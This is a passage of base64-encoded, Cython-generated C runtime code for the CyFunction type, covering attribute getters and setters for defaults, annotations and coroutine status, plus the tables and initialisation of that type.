9wLT5mdW5jX2NvZGUgOiBQeV9Ob25lOwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBQeV9JTkNSRUYocmVzdWx0KTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3ApIHsKICAgIGludCByZXN1bHQgPSAwOwogICAgUHlPYmplY3QgKnJlcyA9IG9wLT5kZWZhdWx0c19nZXR0ZXIoKFB5T2JqZWN0ICopIG9wKTsKICAgIGlmICh1bmxpa2VseSghcmVzKSkKICAgICAgICByZXR1cm4gLTE7CiAgICAjaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUyAmJiAhQ1lUSE9OX0FWT0lEX0JPUlJPV0VEX1JFRlMKICAgIG9wLT5kZWZhdWx0c190dXBsZSA9IFB5VHVwbGVfR0VUX0lURU0ocmVzLCAwKTsKICAgIFB5X0lOQ1JFRihvcC0+ZGVmYXVsdHNfdHVwbGUpOwogICAgb3AtPmRlZmF1bHRzX2t3ZGljdCA9IFB5VHVwbGVfR0VUX0lURU0ocmVzLCAxKTsKICAgIFB5X0lOQ1JFRihvcC0+ZGVmYXVsdHNfa3dkaWN0KTsKICAgICNlbHNlCiAgICBvcC0+ZGVmYXVsdHNfdHVwbGUgPSBfX1B5eF9QeVNlcXVlbmNlX0lURU0ocmVzLCAwKTsKICAgIGlmICh1bmxpa2VseSghb3AtPmRlZmF1bHRzX3R1cGxlKSkgcmVzdWx0ID0gLTE7CiAgICBlbHNlIHsKICAgICAgICBvcC0+ZGVmYXVsdHNfa3dkaWN0ID0gX19QeXhfUHlTZXF1ZW5jZV9JVEVNKHJlcywgMSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFvcC0+ZGVmYXVsdHNfa3dkaWN0KSkgcmVzdWx0ID0gLTE7CiAgICB9CiAgICAjZW5kaWYKICAgIFB5X0RFQ1JFRihyZXMpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgaW50Cl9fUHl4X0N5RnVuY3Rpb25fc2V0X2RlZmF1bHRzKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU9iamVjdCogdmFsdWUsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgaWYgKCF2YWx1ZSkgewogICAgICAgIHZhbHVlID0gUHlfTm9uZTsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkodmFsdWUgIT0gUHlfTm9uZSAmJiAhUHlUdXBsZV9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIl9fZGVmYXVsdHNfXyBtdXN0IGJlIHNldCB0byBhIHR1cGxlIG9iamVjdCIpOwogICAgICAgIHJldHVybiAtMTsKICAgIH0KICAgIFB5RXJyX1dhcm5FeChQeUV4Y19SdW50aW1lV2FybmluZywgImNoYW5nZXMgdG8gY3lmdW5jdGlvbi5fX2RlZmF1bHRzX18gd2lsbCBub3QgIgogICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpOwogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX3R1cGxlLCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX3R1cGxlOwogICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSB7CiAgICAgICAgaWYgKG9wLT5kZWZhdWx0c19nZXR0ZXIpIHsKICAgICAgICAgICAgaWYgKHVubGlrZWx5KF9fUHl4X0N5RnVuY3Rpb25faW5pdF9kZWZhdWx0cyhvcCkgPCAwKSkgcmV0dXJuIE5VTEw7CiAgICAgICAgICAgIHJlc3VsdCA9IG9wLT5kZWZhdWx0c190dXBsZTsKICAgICAgICB9IGVsc2UgewogICAgICAgICAgICByZXN1bHQgPSBQeV9Ob25lOwogICAgICAgIH0KICAgIH0KICAgIFB5X0lOQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkgewogICAgUHlPYmplY3QqIHJlc3VsdCA9IE5VTEw7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHNfbG9ja2VkKG9wKTsKICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBpbnQKX19QeXhfQ3lGdW5jdGlvbl9zZXRfa3dkZWZhdWx0cyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICghdmFsdWUpIHsKICAgICAgICB2YWx1ZSA9IFB5X05vbmU7CiAgICB9IGVsc2UgaWYgKHVubGlrZWx5KHZhbHVlICE9IFB5X05vbmUgJiYgIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIl9fa3dkZWZhdWx0c19fIG11c3QgYmUgc2V0IHRvIGEgZGljdCBvYmplY3QiKTsKICAgICAgICByZXR1cm4gLTE7CiAgICB9CiAgICBQeUVycl9XYXJuRXgoUHlFeGNfUnVudGltZVdhcm5pbmcsICJjaGFuZ2VzIHRvIGN5ZnVuY3Rpb24uX19rd2RlZmF1bHRzX18gd2lsbCBub3QgIgogICAgICAgICAgICAgICAgICJjdXJyZW50bHkgYWZmZWN0IHRoZSB2YWx1ZXMgdXNlZCBpbiBmdW5jdGlvbiBjYWxscyIsIDEpOwogICAgUHlfSU5DUkVGKHZhbHVlKTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgX19QeXhfUHlfWERFQ1JFRl9TRVQob3AtPmRlZmF1bHRzX2t3ZGljdCwgdmFsdWUpOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiAwOwp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHNfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmRlZmF1bHRzX2t3ZGljdDsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkgewogICAgICAgIGlmIChvcC0+ZGVmYXVsdHNfZ2V0dGVyKSB7CiAgICAgICAgICAgIGlmICh1bmxpa2VseShfX1B5eF9DeUZ1bmN0aW9uX2luaXRfZGVmYXVsdHMob3ApIDwgMCkpIHJldHVybiBOVUxMOwogICAgICAgICAgICByZXN1bHQgPSBvcC0+ZGVmYXVsdHNfa3dkaWN0OwogICAgICAgIH0gZWxzZSB7CiAgICAgICAgICAgIHJlc3VsdCA9IFB5X05vbmU7CiAgICAgICAgfQogICAgfQogICAgUHlfSU5DUkVGKHJlc3VsdCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fZ2V0X2t3ZGVmYXVsdHMoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIFB5T2JqZWN0KiByZXN1bHQ7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0c19sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgUHlPYmplY3QqIHZhbHVlLCB2b2lkICpjb250ZXh0KSB7CiAgICBDWVRIT05fVU5VU0VEX1ZBUihjb250ZXh0KTsKICAgIGlmICghdmFsdWUgfHwgdmFsdWUgPT0gUHlfTm9uZSkgewogICAgICAgIHZhbHVlID0gTlVMTDsKICAgIH0gZWxzZSBpZiAodW5saWtlbHkoIVB5RGljdF9DaGVjayh2YWx1ZSkpKSB7CiAgICAgICAgUHlFcnJfU2V0U3RyaW5nKFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAgICAgICAgICAgICAgICAgIl9fYW5ub3RhdGlvbnNfXyBtdXN0IGJlIHNldCB0byBhIGRpY3Qgb2JqZWN0Iik7CiAgICAgICAgcmV0dXJuIC0xOwogICAgfQogICAgUHlfWElOQ1JFRih2YWx1ZSk7CiAgICBfX1B5eF9CRUdJTl9DUklUSUNBTF9TRUNUSU9OKG9wKTsKICAgIF9fUHl4X1B5X1hERUNSRUZfU0VUKG9wLT5mdW5jX2Fubm90YXRpb25zLCB2YWx1ZSk7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIDA7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfYW5ub3RhdGlvbnNfbG9ja2VkKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBQeU9iamVjdCogcmVzdWx0ID0gb3AtPmZ1bmNfYW5ub3RhdGlvbnM7CiAgICBpZiAodW5saWtlbHkoIXJlc3VsdCkpIHsKICAgICAgICByZXN1bHQgPSBQeURpY3RfTmV3KCk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFyZXN1bHQpKSByZXR1cm4gTlVMTDsKICAgICAgICBvcC0+ZnVuY19hbm5vdGF0aW9ucyA9IHJlc3VsdDsKICAgIH0KICAgIFB5X0lOQ1JFRihyZXN1bHQpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucyhfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0ICpvcCwgdm9pZCAqY29udGV4dCkgewogICAgUHlPYmplY3QgKnJlc3VsdDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihvcCk7CiAgICByZXN1bHQgPSBfX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9uc19sb2NrZWQob3ApOwogICAgX19QeXhfRU5EX0NSSVRJQ0FMX1NFQ1RJT04oKTsKICAgIHJldHVybiByZXN1bHQ7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wKSB7CiAgICBpbnQgaXNfY29yb3V0aW5lID0gb3AtPmZsYWdzICYgX19QeXhfQ1lGVU5DVElPTl9DT1JPVVRJTkU7CiAgICBpZiAoaXNfY29yb3V0aW5lKSB7CiAgICAgICAgUHlPYmplY3QgKmlzX2Nvcm91dGluZV92YWx1ZSwgKm1vZHVsZSwgKmZyb21saXN0LCAqbWFya2VyID0gX19weXhfbXN0YXRlX2dsb2JhbC0+X19weXhfbl91X2lzX2Nvcm91dGluZTsKICAgICAgICBmcm9tbGlzdCA9IFB5TGlzdF9OZXcoMSk7CiAgICAgICAgaWYgKHVubGlrZWx5KCFmcm9tbGlzdCkpIHJldHVybiBOVUxMOwogICAgICAgIFB5X0lOQ1JFRihtYXJrZXIpOwojaWYgQ1lUSE9OX0FTU1VNRV9TQUZFX01BQ1JPUwogICAgICAgIFB5TGlzdF9TRVRfSVRFTShmcm9tbGlzdCwgMCwgbWFya2VyKTsKI2Vsc2UKICAgICAgICBpZiAodW5saWtlbHkoUHlMaXN0X1NldEl0ZW0oZnJvbWxpc3QsIDAsIG1hcmtlcikgPCAwKSkgewogICAgICAgICAgICBQeV9ERUNSRUYobWFya2VyKTsKICAgICAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTsKICAgICAgICAgICAgcmV0dXJuIE5VTEw7CiAgICAgICAgfQojZW5kaWYKICAgICAgICBtb2R1bGUgPSBQeUltcG9ydF9JbXBvcnRNb2R1bGVMZXZlbE9iamVjdChfX3B5eF9tc3RhdGVfZ2xvYmFsLT5fX3B5eF9uX3VfYXN5bmNpb19jb3JvdXRpbmVzLCBOVUxMLCBOVUxMLCBmcm9tbGlzdCwgMCk7CiAgICAgICAgUHlfREVDUkVGKGZyb21saXN0KTsKICAgICAgICBpZiAodW5saWtlbHkoIW1vZHVsZSkpIGdvdG8gaWdub3JlOwogICAgICAgIGlzX2Nvcm91dGluZV92YWx1ZSA9IF9fUHl4X1B5T2JqZWN0X0dldEF0dHJTdHIobW9kdWxlLCBtYXJrZXIpOwogICAgICAgIFB5X0RFQ1JFRihtb2R1bGUpOwogICAgICAgIGlmIChsaWtlbHkoaXNfY29yb3V0aW5lX3ZhbHVlKSkgewogICAgICAgICAgICByZXR1cm4gaXNfY29yb3V0aW5lX3ZhbHVlOwogICAgICAgIH0KaWdub3JlOgogICAgICAgIFB5RXJyX0NsZWFyKCk7CiAgICB9CiAgICByZXR1cm4gX19QeXhfUHlCb29sX0Zyb21Mb25nKGlzX2Nvcm91dGluZSk7Cn0Kc3RhdGljIFB5T2JqZWN0ICoKX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCB2b2lkICpjb250ZXh0KSB7CiAgICBQeU9iamVjdCAqcmVzdWx0OwogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICBpZiAob3AtPmZ1bmNfaXNfY29yb3V0aW5lKSB7CiAgICAgICAgcmV0dXJuIF9fUHl4X05ld1JlZihvcC0+ZnVuY19pc19jb3JvdXRpbmUpOwogICAgfQogICAgcmVzdWx0ID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfaXNfY29yb3V0aW5lX3ZhbHVlKG9wKTsKICAgIGlmICh1bmxpa2VseSghcmVzdWx0KSkKICAgICAgICByZXR1cm4gTlVMTDsKICAgIF9fUHl4X0JFR0lOX0NSSVRJQ0FMX1NFQ1RJT04ob3ApOwogICAgaWYgKG9wLT5mdW5jX2lzX2Nvcm91dGluZSkgewogICAgICAgIFB5X0RFQ1JFRihyZXN1bHQpOwogICAgICAgIHJlc3VsdCA9IF9fUHl4X05ld1JlZihvcC0+ZnVuY19pc19jb3JvdXRpbmUpOwogICAgfSBlbHNlIHsKICAgICAgICBvcC0+ZnVuY19pc19jb3JvdXRpbmUgPSBfX1B5eF9OZXdSZWYocmVzdWx0KTsKICAgIH0KICAgIF9fUHl4X0VORF9DUklUSUNBTF9TRUNUSU9OKCk7CiAgICByZXR1cm4gcmVzdWx0Owp9CnN0YXRpYyB2b2lkIF9fUHl4X0N5RnVuY3Rpb25fcmFpc2VfYXJndW1lbnRfY291bnRfZXJyb3IoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqZnVuYywgY29uc3QgY2hhciogbWVzc2FnZSwgUHlfc3NpemVfdCBzaXplKSB7CiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICBQeU9iamVjdCAqcHlfbmFtZSA9IF9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUoZnVuYywgTlVMTCk7CiAgICBpZiAoIXB5X25hbWUpIHJldHVybjsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwUygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIiwKICAgICAgICBweV9uYW1lLCBtZXNzYWdlLCBzaXplKTsKICAgIFB5X0RFQ1JFRihweV9uYW1lKTsKI2Vsc2UKICAgIGNvbnN0IGNoYXIqIG5hbWUgPSAoKFB5Q0Z1bmN0aW9uT2JqZWN0KilmdW5jKS0+bV9tbC0+bWxfbmFtZTsKICAgIFB5RXJyX0Zvcm1hdChQeUV4Y19UeXBlRXJyb3IsCiAgICAgICAgIiUuMjAwcygpICVzICglIiBDWVRIT05fRk9STUFUX1NTSVpFX1QgImQgZ2l2ZW4pIiwKICAgICAgICBuYW1lLCBtZXNzYWdlLCBzaXplKTsKI2VuZGlmCn0Kc3RhdGljIHZvaWQgX19QeXhfQ3lGdW5jdGlvbl9yYWlzZV90eXBlX2Vycm9yKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKmZ1bmMsIGNvbnN0IGNoYXIqIG1lc3NhZ2UpIHsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKICAgIFB5T2JqZWN0ICpweV9uYW1lID0gX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZShmdW5jLCBOVUxMKTsKICAgIGlmICghcHlfbmFtZSkgcmV0dXJuOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJS4yMDBTKCkgJXMiLAogICAgICAgIHB5X25hbWUsIG1lc3NhZ2UpOwogICAgUHlfREVDUkVGKHB5X25hbWUpOwojZWxzZQogICAgY29uc3QgY2hhciogbmFtZSA9ICgoUHlDRnVuY3Rpb25PYmplY3QqKWZ1bmMpLT5tX21sLT5tbF9uYW1lOwogICAgUHlFcnJfRm9ybWF0KFB5RXhjX1R5cGVFcnJvciwKICAgICAgICAiJS4yMDBzKCkgJXMiLAogICAgICAgIG5hbWUsIG1lc3NhZ2UpOwojZW5kaWYKfQojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQpzdGF0aWMgUHlPYmplY3QgKgpfX1B5eF9DeUZ1bmN0aW9uX2dldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIHZvaWQgKmNvbnRleHQpIHsKICAgIENZVEhPTl9VTlVTRURfVkFSKGNvbnRleHQpOwogICAgcmV0dXJuIFB5T2JqZWN0X0dldEF0dHJTdHJpbmcob3AtPmZ1bmMsICJfX21vZHVsZV9fIik7Cn0Kc3RhdGljIGludApfX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUoX19weXhfQ3lGdW5jdGlvbk9iamVjdCAqb3AsIFB5T2JqZWN0KiB2YWx1ZSwgdm9pZCAqY29udGV4dCkgewogICAgQ1lUSE9OX1VOVVNFRF9WQVIoY29udGV4dCk7CiAgICByZXR1cm4gUHlPYmplY3RfU2V0QXR0clN0cmluZyhvcC0+ZnVuYywgIl9fbW9kdWxlX18iLCB2YWx1ZSk7Cn0KI2VuZGlmCnN0YXRpYyBQeUdldFNldERlZiBfX3B5eF9DeUZ1bmN0aW9uX2dldHNldHNbXSA9IHsKICAgIHsiZnVuY19kb2MiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RvYywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kb2MsIDAsIDB9LAogICAgeyJfX2RvY19fIiwgIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZG9jLCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RvYywgMCwgMH0sCiAgICB7ImZ1bmNfbmFtZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfbmFtZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9uYW1lLCAwLCAwfSwKICAgIHsiX19uYW1lX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X25hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfbmFtZSwgMCwgMH0sCiAgICB7Il9fcXVhbG5hbWVfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfcXVhbG5hbWUsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfcXVhbG5hbWUsIDAsIDB9LAogICAgeyJmdW5jX2RpY3QiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2RpY3QsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGljdCwgMCwgMH0sCiAgICB7Il9fZGljdF9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kaWN0LCAoc2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fc2V0X2RpY3QsIDAsIDB9LAogICAgeyJmdW5jX2dsb2JhbHMiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2dsb2JhbHMsIDAsIDAsIDB9LAogICAgeyJfX2dsb2JhbHNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZ2xvYmFscywgMCwgMCwgMH0sCiAgICB7ImZ1bmNfY2xvc3VyZSIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfY2xvc3VyZSwgMCwgMCwgMH0sCiAgICB7Il9fY2xvc3VyZV9fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jbG9zdXJlLCAwLCAwLCAwfSwKICAgIHsiZnVuY19jb2RlIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9jb2RlLCAwLCAwLCAwfSwKICAgIHsiX19jb2RlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2NvZGUsIDAsIDAsIDB9LAogICAgeyJmdW5jX2RlZmF1bHRzIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9kZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9kZWZhdWx0cywgMCwgMH0sCiAgICB7Il9fZGVmYXVsdHNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfZGVmYXVsdHMsIChzZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9zZXRfZGVmYXVsdHMsIDAsIDB9LAogICAgeyJfX2t3ZGVmYXVsdHNfXyIsIChnZXR0ZXIpX19QeXhfQ3lGdW5jdGlvbl9nZXRfa3dkZWZhdWx0cywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9rd2RlZmF1bHRzLCAwLCAwfSwKICAgIHsiX19hbm5vdGF0aW9uc19fIiwgKGdldHRlcilfX1B5eF9DeUZ1bmN0aW9uX2dldF9hbm5vdGF0aW9ucywgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9hbm5vdGF0aW9ucywgMCwgMH0sCiAgICB7Il9pc19jb3JvdXRpbmUiLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X2lzX2Nvcm91dGluZSwgMCwgMCwgMH0sCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB7Il9fbW9kdWxlX18iLCAoZ2V0dGVyKV9fUHl4X0N5RnVuY3Rpb25fZ2V0X21vZHVsZSwgKHNldHRlcilfX1B5eF9DeUZ1bmN0aW9uX3NldF9tb2R1bGUsIDAsIDB9LAojZW5kaWYKICAgIHswLCAwLCAwLCAwLCAwfQp9OwpzdGF0aWMgUHlNZW1iZXJEZWYgX19weXhfQ3lGdW5jdGlvbl9tZW1iZXJzW10gPSB7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX21vZHVsZV9fIiwgVF9PQkpFQ1QsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCBtX21vZHVsZSksIDAsIDB9LAojZW5kaWYKICAgIHsiX19kaWN0b2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihfX3B5eF9DeUZ1bmN0aW9uT2JqZWN0LCBmdW5jX2RpY3QpLCBSRUFET05MWSwgMH0sCiNpZiBDWVRIT05fTUVUSF9GQVNUQ0FMTAojaWYgQ1lUSE9OX0JBQ0tQT1JUX1ZFQ1RPUkNBTEwgfHwgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgeyJfX3ZlY3RvcmNhbGxvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfdmVjdG9yY2FsbCksIFJFQURPTkxZLCAwfSwKI2Vsc2UKICAgIHsiX192ZWN0b3JjYWxsb2Zmc2V0X18iLCBUX1BZU1NJWkVULCBvZmZzZXRvZihQeUNGdW5jdGlvbk9iamVjdCwgdmVjdG9yY2FsbCksIFJFQURPTkxZLCAwfSwKI2VuZGlmCiNpZiBDWVRIT05fQ09NUElMSU5HX0lOX0xJTUlURURfQVBJCiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QsIGZ1bmNfd2Vha3JlZmxpc3QpLCBSRUFET05MWSwgMH0sCiNlbHNlCiAgICB7Il9fd2Vha2xpc3RvZmZzZXRfXyIsIFRfUFlTU0laRVQsIG9mZnNldG9mKFB5Q0Z1bmN0aW9uT2JqZWN0LCBtX3dlYWtyZWZsaXN0KSwgUkVBRE9OTFksIDB9LAojZW5kaWYKI2VuZGlmCiAgICB7MCwgMCwgMCwgIDAsIDB9Cn07CnN0YXRpYyBQeU9iamVjdCAqCl9fUHl4X0N5RnVuY3Rpb25fcmVkdWNlKF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm0sIFB5T2JqZWN0ICphcmdzKQp7CiAgICBQeU9iamVjdCAqcmVzdWx0ID0gTlVMTDsKICAgIENZVEhPTl9VTlVTRURfVkFSKGFyZ3MpOwogICAgX19QeXhfQkVHSU5fQ1JJVElDQUxfU0VDVElPTihtKTsKICAgIFB5X0lOQ1JFRihtLT5mdW5jX3F1YWxuYW1lKTsKICAgIHJlc3VsdCA9IG0tPmZ1bmNfcXVhbG5hbWU7CiAgICBfX1B5eF9FTkRfQ1JJVElDQUxfU0VDVElPTigpOwogICAgcmV0dXJuIHJlc3VsdDsKfQpzdGF0aWMgUHlNZXRob2REZWYgX19weXhfQ3lGdW5jdGlvbl9tZXRob2RzW10gPSB7CiAgICB7Il9fcmVkdWNlX18iLCAoUHlDRnVuY3Rpb24pX19QeXhfQ3lGdW5jdGlvbl9yZWR1Y2UsIE1FVEhfVkFSQVJHUywgMH0sCiAgICB7MCwgMCwgMCwgMH0KfTsKI2lmIENZVEhPTl9DT01QSUxJTkdfSU5fTElNSVRFRF9BUEkKI2RlZmluZSBfX1B5eF9DeUZ1bmN0aW9uX3dlYWtyZWZsaXN0KGN5ZnVuYykgKChjeWZ1bmMpLT5mdW5jX3dlYWtyZWZsaXN0KQojZWxzZQojZGVmaW5lIF9fUHl4X0N5RnVuY3Rpb25fd2Vha3JlZmxpc3QoY3lmdW5jKSAoKChQeUNGdW5jdGlvbk9iamVjdCopY3lmdW5jKS0+bV93ZWFrcmVmbGlzdCkKI2VuZGlmCnN0YXRpYyBQeU9iamVjdCAqX19QeXhfQ3lGdW5jdGlvbl9Jbml0KF9fcHl4X0N5RnVuY3Rpb25PYmplY3QgKm9wLCBQeU1ldGhvZERlZiAqbWwsIGludCBmbGFncywgUHlPYmplY3QqIHF1YWxuYW1lLAogICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICBQeU9iamVjdCAqY2xvc3VyZSwgUHlPYmplY3QgKm1vZHVsZSwgUHlPYmplY3QqIGdsb2JhbHMsIFB5T2JqZWN0KiBjb2RlKSB7CiNpZiAhQ1lUSE9OX0NPTVBJTElOR19JTl9MSU1JVEVEX0FQSQogICAgUHlDRnVuY3Rpb25PYmplY3QgKmNmID0gKFB5Q0Z1bmN0aW9uT2JqZWN0Kikgb3A7CiNlbmRpZgogICAgaWYgKHVubGlrZWx5KG9wID09IE5VTEwpKQogICAgICAgIHJldHVybiBOVUxMOwojaWYgQ1lUSE9OX0NPTVBJTElOR19JTl9MSU